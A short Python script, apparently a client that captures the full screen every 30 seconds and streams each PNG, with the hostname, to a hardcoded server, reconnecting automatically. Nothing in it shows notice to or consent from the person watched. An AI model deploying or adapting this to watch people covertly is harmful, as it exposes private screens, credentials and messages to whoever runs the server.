import socket
import time
from PIL import ImageGrab
import io
import os

SERVER_IP = '192.168.1.11' 
SERVER_PORT = 5005

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                hostname = socket.gethostname().ljust(64).encode()
                s.sendall(hostname)
                
                while True:
                    screenshot = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    screenshot.save(img_bytes, format='PNG')
                    img_data = img_bytes.getvalue()
                    
                   
                    s.sendall(f"{len(img_data):010d}".encode())
                    s.sendall(img_data)
                    
                    time.sleep(30)
                    
        except (ConnectionError, TimeoutError) as e:
            print(f"Connection error: {e}, retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"Fatal error: {e}")
            break

if __name__ == "__main__":
    main()